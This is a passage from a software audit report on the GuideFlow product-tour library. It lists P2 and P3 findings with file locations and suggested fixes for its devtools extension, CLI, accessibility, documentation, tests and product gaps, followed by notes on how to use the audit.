| `firefox-unsupported` | P2 | `packages/devtools/manifest.json:18` | Manifest declares only a service_worker background and the code uses promise-returning chrome.* APIs — the extension cannot run in Firefox | Either drop the Firefox claim from the docs, or add a `webextension-polyfill` dependency, switch all call sites to `browser.*`, add `background.scripts` + `browser_spe… |
| `import-json-silent-and-unvalidated` | P2 | `packages/devtools/src/panel/app.tsx:474` | Import silently ignores invalid JSON and applies unvalidated step objects | Validate the parsed object against the StepDraft shape (require `id` and `title`, coerce/backfill missing ids with `crypto.randomUUID()`), render a visible error banne… |
| `inject-bridge-flag-set-before-load` | P2 | `packages/devtools/src/content/inspector.ts:41` | injectBridge marks itself done before the script loads and ignores onerror, making any load failure permanent and silent | Set `bridgeInjected = true` in `onload` and add `script.onerror = () => { bridgeInjected = false; send({ type: 'GF_BRIDGE_INJECT_FAILED' }); }` so the panel can render… |
| `no-all-frames` | P2 | `packages/devtools/manifest.json:22` | Content script does not set all_frames, so GuideFlow running in any iframe is invisible and unpickable | Add `"all_frames": true` and `"match_about_blank": true`, key the service worker's routing on `${tabId}:${sender.frameId}`, and add a frame selector to the panel heade… |
| `no-distribution-artifact` | P2 | `packages/devtools/package.json:6` | private:true with no zip/web-ext packaging step and no CI artifact — there is no supported way to install the extension | Add a `"package": "vite build && cd dist && zip -r ../guideflow-devtools-$npm_package_version.zip ."` script, add an `actions/upload-artifact` step to ci.yml so every … |
| `panel-accessibility` | P2 | `packages/devtools/src/panel/app.tsx:677` | Panel controls are not keyboard operable: inline edit via <strong onClick>, drag-only reordering, unlabelled icon buttons, non-semantic toggle and tabs | Replace the `<strong>` with a focusable button (or double-click-to-edit plus an explicit edit button), add ↑/↓ move buttons alongside drag, give every icon button an `… |
| `panel-active-tour-unreachable` | P2 | `packages/devtools/src/panel/app.tsx:1162` | The panel's active-tour progress bar can never render — GF_GET_ACTIVE_TOUR is never sent | Send `sendToContent({ type: 'GF_GET_ACTIVE_TOUR' })` on panel mount and on every `GF_TOUR_EVENT` (or on a 500 ms interval while `detected`), and reset `activeTour` to … |
| `panel-swallows-all-page-command-errors` | P2 | `packages/devtools/src/panel/app.tsx:263` | Every panel→page command swallows its error, so the panel has no "content script unavailable" state | Route panel→page commands through the existing background port (`port.postMessage`) and let the service worker call `chrome.tabs.sendMessage`, replying with a delivery… |
| `popup-devtools-and-refresh-buttons-inert` | P2 | `packages/devtools/src/popup/popup.tsx:318` | Popup "DevTools" and "Refresh" buttons produce no visible effect | Replace the DevTools button with inline text ("Press F12 and open the GuideFlow tab") or a link to the docs, and either give the popup a flows list fed by a `GF_GET_FL… |
| `popup-gates-features-on-detection` | P2 | `packages/devtools/src/popup/popup.tsx:377` | Popup disables Pick Element and Record on `!state.detected`, even though neither feature needs GuideFlow on the page | Drop `disabled={!state.detected}` from the Pick Element and Record buttons (popup.tsx:377, 385) and keep the gate only on flow-execution actions (Run tour). Show the d… |
| `record-input-uses-change` | P2 | `packages/devtools/src/content/inspector.ts:198` | Input recording listens for `change`, missing typed values that never blur, and captures raw field values | Listen to `input` (debounced ~400 ms per element) in addition to `change`, add `submit` and `chrome.webNavigation`/`popstate` markers so multi-page flows are represent… |
| `recording-lost-on-navigation` | P2 | `packages/devtools/src/content/inspector.ts:103` | Recording and inspect state live in content-script module scope and die on every navigation, with no persistence and no UI resync | Persist `recordingMode` to `chrome.storage.session` keyed by tabId and re-arm listeners at content-script start when the flag is set; persist accumulated recorded step… |
| `save-tour-no-feedback` | P2 | `packages/devtools/src/panel/app.tsx:447` | Saving a tour gives no confirmation and does not refresh the saved-tours list | Await the response, call `loadSavedTours()` on `{ ok: true }`, and show an inline confirmation. Detect an existing `gf_flow_${id}` before writing and prompt "Overwrite… |
| `selector-attr-shortcuts-not-unique` | P2 | `packages/devtools/src/content/inspector.ts:238` | aria-label and data-testid shortcuts return immediately without checking the selector matches exactly one element | After building any candidate, verify `document.querySelectorAll(candidate).length === 1` and fall through to the next strategy (or append a scoping ancestor / `:nth-of… |
| `selector-no-shadow-dom` | P2 | `packages/devtools/src/content/inspector.ts:255` | buildSelector walks parentElement only, so shadow-DOM elements yield selectors that document.querySelector can never resolve | Use `e.composedPath()[0]` instead of `e.target` to get the true innermost node, walk `node.parentNode` and cross `ShadowRoot` boundaries via `.host`, and emit a struct… |
| `sw-misreads-tour-start-payload` | P2 | `packages/devtools/src/background/service-worker.ts:128` | Service worker reads tour:start args as the flow object, so the popup always shows "unknown" and "Step 1/1" | Read `evt.args?.[0]?.flowId` for the id. For step count, subscribe to `step:enter`'s `{ stepIndex }` and query `gf.totalSteps` via a `GF_GET_ACTIVE_TOUR` round trip ra… |
| `sw-port-disconnect-deletes-wrong-port` | P2 | `packages/devtools/src/background/service-worker.ts:93` | Service worker deletes the port map entry by tabId on disconnect without checking it is still the current port | Guard the delete: `port.onDisconnect.addListener(() => { if (devtoolsPorts.get(tabId) === port) devtoolsPorts.delete(tabId); });` and disconnect any pre-existing port … |
| `bridge-reports-version-unknown` | P3 | `packages/devtools/src/bridge.ts:88` | Bridge reads gf.version, which core does not expose, so the panel header renders "vunknown" | Add a `readonly version: string` to `GuideFlowInstance` populated from the package version at build time, and in the panel treat `'unknown'` as absent (`if (pl?.versio… |
| `content-script-emitted-as-esm` | P3 | `packages/devtools/vite.config.ts:89` | Rollup is configured with a single ES output format, so the content script would break the moment it gains an import | Split the build into two Vite invocations (or use `@crxjs/vite-plugin`): one with `build.rollupOptions.output.format: 'iife'`, `inlineDynamicImports: true` for the `co… |
| `context-menu-duplicate-id-on-update` | P3 | `packages/devtools/src/background/service-worker.ts:45` | contextMenus.create on every onInstalled throws duplicate-id errors when the extension updates | Call `chrome.contextMenus.removeAll(() => { /* create items */ })` inside the `onInstalled` listener. Buffer context-menu captures in `chrome.storage.session` so they … |
| `detection-never-resets-on-navigation` | P3 | `packages/devtools/src/panel/app.tsx:1139` | Panel never clears detected/flows/version when the inspected page navigates away from GuideFlow | Register `chrome.devtools.network.onNavigated.addListener(url => { setDetected(false); setVersion(null); setFlows([]); setSelectedElement(null); appendNavigationMarker… |
| `events-autoscroll-fights-user` | P3 | `packages/devtools/src/panel/app.tsx:724` | Events tab force-scrolls to the bottom on every incoming event with no pause control | Only scroll when the container is already within ~40px of the bottom, add an explicit "Auto-scroll" toggle and a pause button in the Events toolbar, and render a "show… |
| `highlight-selector-unguarded` | P3 | `packages/devtools/src/content/inspector.ts:337` | GF_HIGHLIGHT_SELECTOR passes user-authored strings straight to querySelector with no try/catch | Wrap in try/catch and reply with a `GF_HIGHLIGHT_RESULT` message carrying `{ ok, matchCount, error }`; render it in the panel next to the step (green check / "0 matche… |
| `no-escape-from-inspect-mode` | P3 | `packages/devtools/src/content/inspector.ts:266` | Inspect mode swallows all clicks with no Escape key handler, and the popup closes itself after starting it | Add `document.addEventListener('keydown', e => { if (e.key === 'Escape') { stopInspect(); send({ type: 'GF_INSPECT_STOPPED' }); } }, true)` in `startInspect`, and rend… |
| `panel-ignores-devtools-theme` | P3 | `packages/devtools/src/panel/app.tsx:57` | Panel and popup hardcode a dark palette and ignore chrome.devtools.panels.themeName | Read `chrome.devtools.panels.themeName` on mount, expose the palette as CSS custom properties on `:root`, and provide a light variant; add a `@media (prefers-color-sch… |
| `popup-version-mismatch` | P3 | `packages/devtools/src/popup/popup.tsx:345` | Popup hardcodes version v0.2.0 while the manifest, package, and panel all say 0.1.9 | Replace all four literals with `chrome.runtime.getManifest().version`, which is available in both the popup and the panel. Point the Docs link at the actual published … |

#### cli (9)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `clean-script-not-cross-platform` | P2 | `packages/cli/package.json:49` | `clean` script uses `rm -rf`, which fails on Windows PowerShell/cmd | Replace with `rimraf dist .turbo` (add `rimraf` as a devDependency) or Node's `node -e "fs.rmSync('dist',{recursive:true,force:true})"`. For core's build, swap `cp -r`… |
| `init-no-package-manager-detection` | P2 | `packages/cli/src/commands/init.ts:111` | `init` hardcodes `pnpm add` and never installs or records dependencies | Detect the manager from `process.env.npm_config_user_agent` (falling back to lockfile presence) and print the matching `npm install` / `yarn add` / `pnpm add` / `bun a… |
| `init-typescript-only` | P2 | `packages/cli/src/commands/init.ts:25` | `init` always emits TypeScript and has no JS mode, so it produces uncompilable files in a JavaScript project | Detect TypeScript (presence of `tsconfig.json`, or a `--typescript`/`--js` flag), and add JS variants of the three templates with the type annotations stripped and `.j… |
| `push-export-no-flow-validation` | P2 | `packages/cli/src/commands/push.ts:42` | Neither export nor push validates that the JSON is a FlowDefinition before writing or publishing it | Add a shared `validateFlow(obj): string[]` helper in the CLI asserting `id: string`, `initial: string`, `states: object`, `initial in states`, and each state's `steps[… |
| `vite-unconditional-runtime-dep` | P2 | `packages/cli/src/index.ts:31` | Vite is a hard runtime dependency of every command because studio.ts is statically imported | Make the vite import lazy: move `const { createServer } = await import('vite')` inside the studio action handler, and move `vite` to `peerDependencies` + `peerDependen… |
| `no-validate-doctor-record-commands` | P3 | `packages/cli/src/index.ts:45` | No validate / doctor / record / dry-run commands, and no error taxonomy — every failure is exit code 1 with a raw dump | Add `program.showHelpAfterError().showSuggestionAfterError()` in index.ts. Introduce a small `CliError extends Error { code: number }` with distinct exit codes (2 usag… |
| `studio-port-not-validated` | P3 | `packages/cli/src/commands/studio.ts:17` | studio's --port is parsed with parseInt and never validated, so a bad value silently becomes NaN | Validate after parsing: `if (!Number.isInteger(port) || port < 1 || port > 65535) { console.error(...); process.exit(1); }`, or use Commander's option parser argument … |
| `studio-readme-opens-browser-false` | P3 | `README.md:534` | README claims studio "opens browser" but the server is created with open:false | Either add `-o, --open` (wired to Vite's `server.open`) and default it to true to match the docs, or strike "(opens browser)" from README.md:534. Add `--host` while to… |
| `studio-sigint-does-not-await-close` | P3 | `packages/cli/src/commands/studio.ts:45` | studio's SIGINT handler exits before the server finishes closing, and there is no SIGTERM handler | Make the handler async and await the close: `const shutdown = async () => { await server.close(); process.exit(0); };` registered for both `'SIGINT'` and `'SIGTERM'`. |

#### a11y (12)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `conversational-panel-a11y` | P2 | `packages/react/src/components/ConversationalPanel.tsx:170` | ConversationalPanel removes the input focus ring, never announces AI replies, and claims aria-modal on a non-modal panel | Replace `outline: 'none'` with a `:focus-visible` outline using `--gf-accent-color`. Wrap the message list in `<div role="log" aria-live="polite" aria-relevant="additi… |
| `dark-css-clobbers-themes` | P2 | `packages/core/src/styles/index.css:4` | dark.css is imported after themes.css at equal specificity, so dark mode silently destroys all five built-in themes | Scope the dark declarations so they cannot outrank a theme: use `:root:not([data-gf-theme])` in the media query, or move dark.css before themes.css in index.css and gi… |
| `dead-spotlight-options` | P2 | `packages/core/src/engine/spotlight.ts:57` | overlayColor and animated spotlight options are documented and defaulted but never read | Consume `this._options.overlayColor` in `_update()` when building both the overlay background and the cutout box-shadow (compose it with `overlayOpacity`, or accept a … |
| `docs-claim-accessible-by-default` | P2 | `apps/docs/index.md:42` | Docs homepage advertises focus management, high-contrast and RTL 'out of the box' that the code does not implement | Soften the homepage feature card to what is actually true today, and add `apps/docs/guide/accessibility.md` stating the current conformance level honestly with a list … |
| `forced-colors-adjust-none-defeats-hc` | P2 | `packages/core/src/styles/high-contrast.css:3` | forced-color-adjust: none on .gf-popover opts the whole popover subtree out of the user's forced-colors palette | Remove `forced-color-adjust: none` from `.gf-popover` (keep it only on the specific decorative elements that need it, such as the beacon). Extend the `@media (forced-c… |
| `hotspot-touch-target-and-tooltip-invisible-to-at` | P2 | `packages/core/src/engine/hotspot.ts:26` | Hotspot beacon is a 12px touch target whose tooltip body text is never exposed to assistive technology | Give `.gf-hotspot` `min-width:24px; min-height:24px; display:grid; place-items:center` so the hit area meets 2.5.8 while the visual dot stays 12px; do the same for `.g… |
| `i18n-no-plural-intl-detection` | P2 | `packages/core/src/i18n/index.ts:44` | i18n has no pluralisation, no Intl number/date formatting, no locale detection, no lazy loading, and ships only English | Format numeric vars with `new Intl.NumberFormat(this._active).format(v)` when `typeof v === 'number'`. Add optional `Intl.PluralRules` selection (`{ one, other }` valu… |
| `placement-math-not-direction-aware` | P2 | `packages/core/src/engine/popover.ts:46` | Popover placement math has no direction awareness — -start/-end placements are wrong in RTL | Read the effective direction once per compute (`getComputedStyle(targetElement).direction`) and, when `rtl`, swap the x-axis meaning of `-start`/`-end` and mirror the … |
| `progressbar-no-name-or-valuetext` | P2 | `packages/core/src/renderer/default-renderer.ts:169` | role=progressbar has no accessible name and no aria-valuetext, so it announces as a bare percentage | Add `aria-label="${i18n.t('progressLabel')}"` (new i18n key, e.g. "Tour progress") and `aria-valuetext="${i18n.t('stepOf', { current: index + 1, total })}"` to both pr… |
| `storybook-theme-stories-are-identical` | P2 | `apps/storybook/stories/TourFlow.stories.tsx:95` | Three Storybook 'theme' stories apply no theme and render identically to Default | Add a decorator that sets `document.documentElement.dataset.gfTheme` from a story arg (and cleans up on unmount), then parameterise the theme stories over all five val… |
| `i18n-strings-unescaped-in-html` | P3 | `packages/core/src/renderer/default-renderer.ts:175` | Translation strings are interpolated into innerHTML without escaping, unlike step content | Route every `i18n.t(...)` result through `this._esc()` at the interpolation sites in `_buildHTML`, or replace the `innerHTML` template with DOM construction (`createEl… |
| `top-layer-z-index` | P3 | `packages/core/src/renderer/default-renderer.ts:27` | z-index 999999 cannot compete with the top layer, fullscreen, or shadow DOM — the tour is invisible over native dialogs | Render the popover into a `<dialog>` opened with `showModal()` (which also delivers native focus containment, background inertness, and Escape handling for free), or e… |

#### docs-tests (9)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `axe-playwright-wrong-import` | P2 | `apps/e2e/tests/accessibility.spec.ts:2` | accessibility.spec.ts default-imports AxeBuilder from a package that has no such export | Either swap the dependency to `@axe-core/playwright` in `apps/e2e/package.json` and import `{ AxeBuilder }`, or rewrite the spec against the installed API: `import { i… |
| `cloud-push-nonexistent-service` | P2 | `packages/cli/src/commands/push.ts:132` | `push` and the demo default to api.guideflow.dev, a service with no evidence of existing | Either document GuideFlow Cloud (signup, key issuance, API contract, data handling) or remove the default endpoint so `--endpoint` becomes required, and reword README.… |
| `committed-build-output` | P2 | `.gitignore:8` | Storybook build output is committed to git, so a stale prebuilt site ships with every clone | Add `storybook-static` and `**/storybook-static` to .gitignore and `git rm -r --cached apps/storybook/storybook-static`. If a published Storybook is wanted, add a work… |
| `duplicated-doc-surfaces` | P2 | `.github/workflows/docs.yml:41` | Two full documentation sites coexist; the hand-written docs/*.html is stale, unpublished, and still triggers deploys | Delete `docs/` (the useful content is already in apps/docs), or convert it into a redirect stub. Remove `'docs/**'` from the docs.yml `paths` trigger. Add a note to CL… |
| `missing-support-docs` | P2 | `apps/docs/.vitepress/config.ts:159` | No SSR guide, CSP guide, browser support matrix, troubleshooting, examples directory, or playground | Add guide pages: SSR & Hydration (Next.js/Nuxt/SvelteKit patterns), CSP (required `style-src` directives, nonce plumbing, the `content.html` trust boundary), Browser S… |
| `no-visual-regression-or-a11y-unit-tests` | P2 | `apps/storybook/package.json:8` | No visual regression testing and no accessibility assertions in any unit test | Add `axe-core` to packages/core devDependencies and assert zero violations against the rendered popover inside renderer.test.ts; assert `document.activeElement` lands … |
| `popover-coverage-gaps` | P2 | `packages/core/src/__tests__/popover.test.ts:7` | Popover positioning tests cover 4 of 13 placements and never exercise a scrolled viewport | Add a table-driven test over all 13 `PopoverPlacement` values asserting the returned `placement` and geometry, plus explicit cases with `viewport = { x: 0, y: 600, wid… |
| `sync-script-misses-surfaces` | P2 | `scripts/sync-repo-meta.mjs:86` | sync-repo-meta.mjs cannot fix the identity drift it exists to prevent — it never touches source headers, the root README, LICENSE, or most docs | Add a recursive pass over `packages/*/src/**/*.{ts,tsx}` replacing the `@github`/`@email` header lines, plus explicit passes over README.md, LICENSE, apps/docs/guide/*… |
| `zero-tests-analytics-transports` | P2 | `packages/analytics/src/transports/posthog.ts:1` | Four of five analytics transports have zero tests | Add packages/analytics/src/__tests__/transports.test.ts that, for each of the four, stubs the vendor global via `vi.stubGlobal`, tracks an event, asserts the exact ven… |

#### product-gaps (11)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `no-benchmark-suite-or-runtime-perf-budget` | P2 | `packages/core/package.json:76` | No benchmark suite and no runtime performance budget — only an unenforced 12 kB size limit on one package | Add a vitest bench suite covering step transition, spotlight reposition-on-scroll, and computePosition throughput with committed baselines; add size-limit entries to a… |
| `no-library-error-reporting-hook` | P2 | `packages/core/src/engine/tour.ts:368` | No onError hook, no error-reporting integration, and the debug flag only gates a single console.warn | Add `onError?: (err: GuideFlowError) => void` to GuideFlowConfig, route every current console.warn through it with a structured code (TARGET_NOT_FOUND, STORAGE_UNAVAIL… |
| `no-per-locale-step-content-mechanism` | P2 | `packages/core/src/types/index.ts:36` | i18n covers only 8 chrome strings — step content itself has no localisation mechanism at all | Allow StepContent fields to accept a translation key resolved through the instance's I18nRegistry (or accept `Record<locale, StepContent>`), have TourEngine resolve ag… |
| `no-preview-staging-or-collaboration-model` | P2 | `packages/core/src/types/index.ts:104` | No draft/published distinction, no preview or staging mode, and no collaboration or permissions model | At minimum add `gf.preview(flow)` that starts a flow while bypassing isDismissed/isCompleted/snapshot restore and suppresses analytics, plus a documented convention fo… |
| `no-shadow-dom-or-iframe-target-resolution` | P2 | `packages/core/src/engine/tour.ts:287` | Target resolution is a bare document.querySelector — web components and iframes cannot be toured | Add a shadow-piercing resolver in packages/core/src/engine/tour.ts that walks open shadowRoots (and optionally same-origin iframes), plus a `resolveTarget?: (selector:… |
| `no-touch-or-mobile-support` | P2 | `packages/core/src/styles/popover.css:13` | Zero touch/pointer handling and no responsive popover strategy — the library is desktop-keyboard-only | Add touch handling to TourEngine (swipe left/right to navigate, guarded by a `gestures` config flag), add a narrow-viewport placement strategy in computePosition that … |
| `only-changelog-is-stale-unpublished-html` | P2 | `docs/changelog.html:1` | The only changelog is docs/changelog.html, stuck at v0.1.4 in the unpublished hand-written site, and there is no deprecation policy | Generate CHANGELOG.md per package via changesets (see changeset-directory-empty-release-inert), delete or redirect docs/changelog.html, add a Releases page to the Vite… |
| `autoinit-binds-attribute-tours-to-deprecated-singleton` | P3 | `packages/core/src/index.ts:385` | autoInit() routes attribute tours through the deprecated `guideflow` proxy and is documented nowhere | Change the fallback to getGuideFlow(), return the created instance from autoInit(), and document it on apps/docs/guide/migrate-intro.md as the supported drop-in entry … |
| `featureflags-context-field-is-dead-api` | P3 | `packages/core/src/types/index.ts:196` | GuidanceContext.featureFlags is a published API surface that no code in core, the adapters, or the docs ever reads | Either wire it into a flow-level gate (`FlowDefinition.requiresFlag`) evaluated in createGuideFlow's start(), and document an OpenFeature-shaped provider hook, or remo… |
| `no-licensing-or-commercial-model` | P3 | `LICENSE:3` | The project markets a hosted Cloud product while shipping MIT everywhere with no pricing, no CLA, and a LICENSE naming the wrong GitHub account | Fix the LICENSE copyright URL to match repo.config.json (and extend scripts/sync-repo-meta.mjs to cover LICENSE), then state the commercial posture explicitly in READM… |
| `sitemap-hand-written-six-urls-for-57-page-site` | P3 | `apps/docs/public/sitemap.xml:3` | apps/docs/public/sitemap.xml is hand-written with 6 URLs for a 57-page site and is never regenerated | Replace the static file with VitePress's built-in `sitemap: { hostname }` config in apps/docs/.vitepress/config.ts, which generates entries for every built page, and d… |
---

## 7. Resolved

None yet. When a finding is fixed:

1. set `"status": "resolved"` and add `"resolvedIn": "<commit or PR>"` in
   [`audit-findings.json`](audit-findings.json);
2. move its entry to the table below;
3. name the test that pins it.

| id | severity | resolved in | pinned by |
|---|---|---|---|
| — | — | — | — |

---

## 8. How to use this document

- **To do work:** go to [`REMEDIATION-PLAN.md`](REMEDIATION-PLAN.md), which sequences these findings
  into phases. Do not work straight from this list — the ordering matters (e.g. the e2e harness must
  run before any geometry or a11y fix can be verified).
- **To filter or automate:** use [`audit-findings.json`](audit-findings.json).
- **To re-audit:** run `/audit-refresh`. Keep finding ids stable so history stays traceable.
- **Verdict field:** `CONFIRMED` means a second agent independently reproduced the reasoning from
  source. `PLAUSIBLE` means the concern is real but the stated impact was not fully proven.
  `UNVERIFIED` applies to the completeness-critic findings, which describe absent features rather than
  defects in existing code and so had nothing to re-read.
- Findings marked **(reproduced)** in §2 were additionally confirmed by executing code during this
  audit, not only by reading it.
